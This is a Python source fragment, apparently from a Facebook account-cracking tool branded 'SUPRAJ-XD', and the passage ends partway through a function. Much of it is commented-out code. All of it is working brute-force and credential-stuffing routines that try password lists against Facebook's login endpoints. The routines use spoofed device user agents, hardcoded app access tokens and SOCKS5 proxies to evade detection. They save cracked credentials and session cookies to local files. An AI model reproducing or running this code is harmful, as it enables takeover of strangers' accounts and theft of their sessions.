#                         ua  = '[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/({density=1.5,width=480,height=800};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/({density=1.5,width=480,height=800};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/*{density=4.0,width=1440,eight=2560};FBLC/en_US;FBCR/3.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+mmp+';FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi:;]'
#                         random_seed = random.Random()
#                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
#                         device_id = str(uuid.uuid4())
#                         secure = str(uuid.uuid4())
#                         family = str(uuid.uuid4())
#                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
#                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
#                         sm=['GT-', 'SM-']
#                         sim_serials = f'["{xd}"]'
#                         li = ['28','29','210']
#                         li2 = random.choice(li)
#                         j1 = ''.join(random.choice(digits) for _ in range(2))
#                         jazoest = li2+j1
#                         data = {
#                                 "adid": adid,
# "format": "json",
# "device_id": str(uuid.uuid4()),
# "cpl": "true",
# "family_device_id": str(uuid.uuid4()),
# "credentials_type": "device_based_login_password",
# "error_detail_type": "button_with_disabled",
# "source": "device_based_login",
# "email": ids,
# "password": pas,
# "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
# "generate_session_cookies": "1",
# "meta_inf_fbmeta": "",
# "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
# "currently_logged_in_userid": "0",
# "locale": "en_US",
# "client_country_code": "US",
# "method": "auth.login",
# "fb_api_req_friendly_name": "authenticate",
# "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
# "api_key": "882a8490361da98702bf97a021ddc14d",}
#                         headers={
#                                 'User-Agent': ua,
# 'Content-Type': 'application/x-www-form-urlencoded',
# 'Host': 'graph.facebook.com',
# 'X-FB-Net-HNI': '25227',
# 'X-FB-SIM-HNI': '29752',
# 'X-FB-Connection-Type': 'MOBILE.LTE',
# 'X-Tigon-Is-Retry': 'False',
# 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
# 'x-fb-device-group': '5120',
# 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
# 'X-FB-Request-Analytics-Tags': 'graphservice',
# 'X-FB-HTTP-Engine': 'Liger',
# 'X-FB-Client-IP': 'True',
# 'X-FB-Server-Cluster': 'True',
# 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
# 'Content-Length': '706'}
#                         url = 'https://b-graph.facebook.com/auth/login'
#                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
#                         po = requests.post(url,data=data,headers=headers).json()
#                         if 'session_key' in po:
#                                         print('\r\r\033[1;32m [R-OK] '+ids+' | '+pas+'\033[1;97m')
#                                         open('/sdcard/R-OK.txt','a').write(ids+'|'+pas+'\n')
#                                         oks.append(ids)
#                                         break
#                         elif twf in str(po):
#                                         if 'y' in pcp:
#                                                 print('\r\r \033[1;34m[USMII-2F] '+ids+' | '+pas)
#                                                 twf.append(ids)
#                                                 break
#                         elif 'www.facebook.com' in po['error']['message']:
#                                         if 'y' in pcp:
#                                                 print('\r\r\x1b[1;31m [R-CP] '+ids+' | '+pas+'\033[1;97m')
#                                                 open('/sdcard/R-CP.txt','a').write(ids+'|'+pas+'\n')
#                                                 break
#                                                 cps.append(ids)
#                                         else:
#                                                 open('/sdcard/R-CP.txt','a').write(ids+'|'+pas+'\n')
#                                                 break
#                                                 cps.append(ids)
#                         else:
#                                         continue
#                 loop+=1
#         except Exception as e:
#                 pass
# def api1(ids,names,passlist):
#         global loop
#         global oks
#         ua = random.choice(ugen)
#         sys.stdout.write('\r\r\033[1;37m [R-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
#         try:
#                 for pas in passlist:
#                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
#                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
#                         fbbv = str(random.randint(111111111,999999999))
#                         android_version = device['android_version']
#                         model = device['model']
#                         build = device['build']
#                         fblc = device['fblc']
#                         fbcr = sim_id
#                         fbmf = device['fbmf']
#                         fbbd = device['fbbd']
#                         fbdv = device['fbdv']
#                         fbsv = device['fbsv']
#                         fbca = device['fbca']
#                         fbdm = device['fbdm']
#                         fbfw = '1'
#                         fbrv = '0'
#                         fban = 'FB4A'
#                         fbpn = 'com.facebook.katana'
#                         en = random.choice(['en_US','en_GB'])
#                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
#                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
#                         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
#                         random_seed = random.Random()
#                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
#                         device_id = str(uuid.uuid4())
#                         secure = str(uuid.uuid4())
#                         family = str(uuid.uuid4())
#                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
#                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
#                         sm=['GT-', 'SM-']
#                         sim_serials = f'["{xd}"]'
#                         li = ['28','29','210']
#                         li2 = random.choice(li)
#                         j1 = ''.join(random.choice(digits) for _ in range(2))
#                         jazoest = li2+j1
#                         data = {
#                                 'adid':adid,
#                                 'format':'json',
#                                 'device_id':device_id,
#                                 'email':ids,
#                                 'password':pas,
#                                 'generate_analytics_claims':'1',
#                                 'credentials_type':'password',
#                                 'source':'login',
#                                 'error_detail_type':'button_with_disabled',
#                                 'enroll_misauth':'false',
#                                 'generate_session_cookies':'1',
#                                 'generate_machine_id':'1',
#                                 'fb_api_req_friendly_name':'authenticate',
#                         }
#                         headers={
#                                 'Authorization':f'OAuth {accessToken}',
#                                 'X-FB-Friendly-Name':'authenticate',
#                                 'X-FB-Connection-Type':'unknown',
#                                 'User-Agent':ua,
#                                 'Accept-Encoding':'gzip, deflate',
#                                 'Content-Type': 'application/x-www-form-urlencoded',
#                                 'X-FB-HTTP-Engine': 'Liger'
#                                 }
#                         url = 'https://b-graph.facebook.com/auth/login'
#                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
#                         po = requests.post(url,data=data,headers=headers).json()
#                         if 'session_key' in po:
#                                 try:
#                                         uid = po['uid']
#                                 except:
#                                         uid = ids
#                                 if str(uid) in oks:
#                                         break
#                                 else:
#                                         print('\r\r\033[1;32m [R-OK] '+str(uid)+' | '+pas+'\033[1;97m')
#                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
#                                         #print("\r\r\033[1;33m Cookie: "+coki)
#                                         open('/sdcard/R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
#                                         open('/sdcard/R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
#                                         oks.append(str(uid))
#                                         break
#                         elif 'www.facebook.com' in po['error']['message']:
#                                 try:
#                                         uid = po['error']['error_data']['uid']
#                                 except:
#                                         uid = ids
#                                 if uid in oks:pass
#                                 else:
#                                     #    print('\r\r\x1b[1;31m [USMII-CP] '+str(uid)+' | '+pas+'\033[1;97m')
#                                         open('/sdcard/R.txt','a').write(str(uid)+'|'+pas+'\n')
#                                         cps.append(str(ids))
#                                         break
#                         else:continue
#                 loop+=1
#         except Exception as e:
#                 pass
                        
# def rndm(ids,passlist):
#         global loop
#         global oks
#         ua = random.choice(ugen)
#         sys.stdout.write('\r\r\033[1;37m [R] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
#         try:
#                 for pas in passlist:
#                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
#                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
#                         fbbv = str(random.randint(111111111,999999999))
#                         android_version = device['android_version']
#                         model = device['model']
#                         build = device['build']
#                         fblc = device['fblc']
#                         fbcr = sim_id
#                         fbmf = device['fbmf']
#                         fbbd = device['fbbd']
#                         fbdv = device['fbdv']
#                         fbsv = device['fbsv']
#                         fbca = device['fbca']
#                         fbdm = device['fbdm']
#                         fbfw = '1'
#                         fbrv = '0'
#                         fban = 'FB4A'
#                         fbpn = 'com.facebook.katana'
#                         en = random.choice(['en_US','en_GB'])
#                         motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
#                         mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
#                         mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
#                         bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
#                         mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
#                         mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
#                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
#                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])           
#                         random_seed = random.Random()
#                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
#                         device_id = str(uuid.uuid4())
#                         secure = str(uuid.uuid4())
#                         family = str(uuid.uuid4())
#                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
#                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
#                         sm=['GT-', 'SM-']
#                         sim_serials = f'["{xd}"]'
#                         li = ['28','29','210']
#                         li2 = random.choice(li)
#                         j1 = ''.join(random.choice(digits) for _ in range(2))
#                         jazoest = li2+j1
#                         data = {
#                                 'adid':adid,
#                                 'format':'json',
#                                 'device_id':device_id,
#                                 'email':ids,
#                                 'password':pas,
#                                 'generate_analytics_claims':'1',
#                                 'credentials_type':'password',
#                                 'source':'login',
#                                 'error_detail_type':'button_with_disabled',
#                                 'enroll_misauth':'false',
#                                 'generate_session_cookies':'1',
#                                 'generate_machine_id':'1',
#                                 'fb_api_req_friendly_name':'authenticate',
#                         }
#                         headers={
#                                 'Authorization':f'OAuth {accessToken}',
#                                 'X-FB-Friendly-Name':'authenticate',
#                                 'X-FB-Connection-Type':'unknown',
#                                 'User-Agent':ua,
#                                 'Accept-Encoding':'gzip, deflate',
#                                 'Content-Type': 'application/x-www-form-urlencoded',
#                                 'X-FB-HTTP-Engine': 'Liger'
#                                 }
#                         url = 'https://b-graph.facebook.com/auth/login'
#                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
#                         po = requests.post(url,data=data,headers=headers).json()
#                         if 'session_key' in po:
#                                 try:
#                                         uid = po['uid']
#                                 except:
#                                         uid = ids
#                                 if str(uid) in oks:
#                                         break
#                                 else:
#                                         print('\r\r\033[1;32m [R-OK] '+str(uid)+' | '+pas+'\033[1;97m')
#                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
#                                         #print("\r\r\033[1;33m Cookie: "+coki)
#                                         open('/sdcard/R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
#                                         open('/sdcard/R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
#                                         oks.append(str(uid))
#                                         break
#                         elif 'www.facebook.com' in po['error']['message']:
#                                 try:
#                                         uid = po['error']['error_data']['uid']
#                                 except:
#                                         uid = ids
#                                 if uid in oks:pass
#                                 else:
#                                     #    print('\r\r\x1b[1;31m [R-CP] '+str(uid)+' | '+pas+'\033[1;97m')
#                                         open('/sdcard/R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
#                                         cps.append(str(ids))
#                                         break
#                         else:continue
#                 loop+=1
#         except Exception as e:
#                 pass
                        
# try:
#         menu()
# except requests.exceptions.ConnectionError:
#         print('\n No internet connection ...')
#         exit()

# # keep it
# def crackfree(idf, pwv):
#     global loop, ok, cp
#     sys.stdout.write(f"\r {P}[SUPRAJ-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]  ")
#     sys.stdout.flush()
#     ua = random.choice(ugen)
#     ua2 = random.choice(ugen2)
#     ses = requests.Session()
#     for pw in pwv:
#         try:
#             ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'sec-ch-ua-mobile': '?1', 'upgrade-insecure-requests': '1', 'user-agent': random.choice(get_ua_list), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
#             p = ses.get('https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D658182831284939%26cbt%3D1684044646644%26e2e%3D%257B%2522init%2522%253A1684044646645%257D%26ies%3D0%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D297fce79-2a5f-4f0e-a658-2984b6b37b72%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb658182831284939%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D36e881f3-202f-4db0-aada-31426d46b4d8%26tp%3Dunspecified&cancel_url=fb658182831284939%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
#             dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), "uid": idf, "next": "https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified", "flow": "login_no_pin", "pass": pw}
#             koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
#             koki += ' m_pixel_ratio=2.625; wd=412x756'
#             heade = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'upgrade-insecure-requests': '1', 'origin': 'https://m.facebook.com', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'XMLHttpRequest', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D658182831284939%26cbt%3D1684044646644%26e2e%3D%257B%2522init%2522%253A1684044646645%257D%26ies%3D0%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D297fce79-2a5f-4f0e-a658-2984b6b37b72%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb658182831284939%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D36e881f3-202f-4db0-aada-31426d46b4d8%26tp%3Dunspecified&cancel_url=fb658182831284939%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
#             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID', data=dataa, allow_redirects=False)
#             if "checkpoint" in po.cookies.get_dict().keys():
#                 print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
#                 open('CP/' + cph, 'a').write(idf + '|' + pw + '\n')
#                 cp += 1
#                 break
#             elif "c_user" in ses.cookies.get_dict().keys():
#                 ok += 1
#                 coki = po.cookies.get_dict()
#                 kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
#                 cookie = f"sb={sb};{kuki}"
#                 kukis = kuki.replace(f'c_user={idf};datr', 'sb')
#                 print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
#                 open('OK/' + okh, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
#                 print(f"\033[38;5;46m[\033[0;36mCOOKIE\033[38;5;46m]> {cookie}")
#                 cek_apk(session, coki)
#                 break
#             else:
#                 continue
#         except requests.exceptions.ConnectionError:
#             waktu(31)
#     loop += 1

#------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}[SUPRAJ-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
